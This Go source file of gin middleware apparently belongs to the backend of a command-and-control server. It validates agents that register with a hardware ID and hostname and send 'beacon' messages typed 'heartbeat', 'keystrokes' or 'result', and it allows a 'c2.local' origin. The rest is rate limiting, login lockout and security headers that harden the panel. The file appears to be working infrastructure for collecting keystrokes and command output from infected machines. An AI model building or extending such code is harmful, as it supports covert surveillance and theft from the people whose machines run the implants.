package api

import (
	"bytes"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
)

type failBucket struct {
	fails int
	until time.Time
	hits  []time.Time
}

var (
	guardMu sync.Mutex
	guard   = map[string]*failBucket{}
	agentMu sync.Mutex
	agentRL = map[string]*failBucket{}
)

func agentGate() gin.HandlerFunc {
	return func(c *gin.Context) {
		if c.GetHeader("Origin") != "" || c.GetHeader("Sec-Fetch-Site") != "" {
			c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": "forbidden"})
			return
		}
		ct := strings.ToLower(c.GetHeader("Content-Type"))
		if !strings.HasPrefix(ct, "application/json") {
			c.AbortWithStatusJSON(http.StatusBadRequest, gin.H{"error": "json required"})
			return
		}
		ip := clientIP(c)
		now := time.Now()
		agentMu.Lock()
		b := agentRL[ip]
		if b == nil {
			b = &failBucket{}
			agentRL[ip] = b
		}
		cut := now.Add(-60 * time.Second)
		fresh := b.hits[:0]
		for _, t := range b.hits {
			if t.After(cut) {
				fresh = append(fresh, t)
			}
		}
		b.hits = append(fresh, now)
		n := len(b.hits)
		agentMu.Unlock()
		if n > 60 {
			c.AbortWithStatusJSON(http.StatusTooManyRequests, gin.H{"error": "rate limited"})
			return
		}
		raw, err := c.GetRawData()
		if err != nil || len(raw) < 8 || len(raw) > 1<<20 {
			c.AbortWithStatusJSON(http.StatusBadRequest, gin.H{"error": "bad body"})
			return
		}
		c.Request.Body = io.NopCloser(bytes.NewReader(raw))
		var msg map[string]any
		if json.Unmarshal(raw, &msg) != nil {
			c.AbortWithStatusJSON(http.StatusBadRequest, gin.H{"error": "bad json"})
			return
		}
		hw, _ := msg["hw_id"].(string)
		if strings.TrimSpace(hw) == "" || len(hw) > 128 {
			c.AbortWithStatusJSON(http.StatusBadRequest, gin.H{"error": "hw_id required"})
			return
		}
		path := c.Request.URL.Path
		if strings.HasSuffix(path, "/agent") {
			host, _ := msg["hostname"].(string)
			if strings.TrimSpace(host) == "" {
				c.AbortWithStatusJSON(http.StatusBadRequest, gin.H{"error": "hostname required"})
				return
			}
		}
		if strings.HasSuffix(path, "/beacon") {
			typ, _ := msg["type"].(string)
			switch typ {
			case "heartbeat", "keystrokes", "result":
			default:
				c.AbortWithStatusJSON(http.StatusBadRequest, gin.H{"error": "bad type"})
				return
			}
		}
		c.Next()
	}
}

func clientIP(c *gin.Context) string {
	// Platform-set headers only. Client-supplied X-Forwarded-For / True-Client-IP
	// are ignored so lockout buckets cannot be spoofed.
	if v := strings.TrimSpace(c.GetHeader("X-Vercel-Forwarded-For")); v != "" {
		return strings.TrimSpace(strings.Split(v, ",")[0])
	}
	if c.GetHeader("CF-Ray") != "" {
		if v := strings.TrimSpace(c.GetHeader("CF-Connecting-IP")); v != "" {
			return v
		}
	}
	if v := strings.TrimSpace(c.GetHeader("X-Real-IP")); v != "" {
		return v
	}
	host, _, err := net.SplitHostPort(c.Request.RemoteAddr)
	if err == nil {
		return host
	}
	return c.ClientIP()
}

func SecurityHeaders() gin.HandlerFunc {
	return func(c *gin.Context) {
		c.Header("X-Content-Type-Options", "nosniff")
		c.Header("X-Frame-Options", "DENY")
		c.Header("X-XSS-Protection", "0")
		c.Header("Referrer-Policy", "no-referrer")
		c.Header("Permissions-Policy", "camera=(), microphone=(), geolocation=()")
		c.Header("Cross-Origin-Opener-Policy", "same-origin")
		c.Header("Cross-Origin-Resource-Policy", "same-origin")
		c.Header("X-Permitted-Cross-Domain-Policies", "none")
		c.Header("Content-Security-Policy",
			"default-src 'self'; "+
				"script-src 'self'; "+
				"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "+
				"font-src 'self' https://fonts.gstatic.com data:; "+
				"img-src 'self' data: blob:; "+
				"connect-src 'self' wss: https:; "+
				"frame-ancestors 'none'; "+
				"base-uri 'self'; "+
				"form-action 'self'; "+
				"object-src 'none'")
		if c.Request.TLS != nil || strings.EqualFold(c.GetHeader("X-Forwarded-Proto"), "https") || c.GetHeader("CF-Visitor") != "" {
			c.Header("Strict-Transport-Security", "max-age=63072000; includeSubDomains; preload")
		}
		c.Next()
	}
}

func AllowedOrigin(origin string) bool {
	switch strings.TrimRight(origin, "/") {
	case "https://chemical-umbra.vercel.app",
		"https://chemical-umbra-landing.vercel.app",
		"https://thechoicervoicergames.com",
		"http://c2.local",
		"https://c2.local",
		"http://localhost:5173",
		"http://127.0.0.1:5173",
		"http://localhost:8080",
		"http://127.0.0.1:8080":
		return true
	default:
		return false
	}
}

func requireSession() gin.HandlerFunc {
	return func(c *gin.Context) {
		if bearerUser(c) == "" {
			c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"error": "not logged in"})
			return
		}
		c.Next()
	}
}

func authGuard() gin.HandlerFunc {
	return func(c *gin.Context) {
		p := c.Request.URL.Path
		if c.Request.Method != http.MethodPost || (!strings.HasSuffix(p, "/auth/login") && !strings.HasSuffix(p, "/auth/register") && !strings.HasSuffix(p, "/auth/recover")) {
			c.Next()
			return
		}
		ip := clientIP(c)
		now := time.Now()
		guardMu.Lock()
		b := guard[ip]
		if b == nil {
			b = &failBucket{}
			guard[ip] = b
		}
		if now.Before(b.until) {
			wait := int(time.Until(b.until).Seconds())
			guardMu.Unlock()
			c.Header("Retry-After", itoa(wait))
			c.JSON(http.StatusTooManyRequests, gin.H{"error": "locked out", "retry_after": wait})
			c.Abort()
			return
		}
		cut := now.Add(-60 * time.Second)
		fresh := b.hits[:0]
		for _, t := range b.hits {
			if t.After(cut) {
				fresh = append(fresh, t)
			}
		}
		b.hits = append(fresh, now)
		if len(b.hits) > 20 {
			b.until = now.Add(2 * time.Minute)
			guardMu.Unlock()
			c.Header("Retry-After", "120")
			c.JSON(http.StatusTooManyRequests, gin.H{"error": "rate limited"})
			c.Abort()
			return
		}
		guardMu.Unlock()
		c.Next()
	}
}

func recordAuthFail(ip string) {
	if ip == "" {
		return
	}
	now := time.Now()
	guardMu.Lock()
	b := guard[ip]
	if b == nil {
		b = &failBucket{}
		guard[ip] = b
	}
	b.fails++
	if b.fails >= 8 {
		b.until = now.Add(15 * time.Minute)
		b.fails = 0
	}
	guardMu.Unlock()
}

func recordAuthOK(ip string) {
	if ip == "" {
		return
	}
	guardMu.Lock()
	if b := guard[ip]; b != nil {
		b.fails = 0
	}
	guardMu.Unlock()
}

func itoa(n int) string {
	if n < 1 {
		return "1"
	}
	buf := [12]byte{}
	i := len(buf)
	for n > 0 {
		i--
		buf[i] = byte('0' + n%10)
		n /= 10
	}
	return string(buf[i:])
}
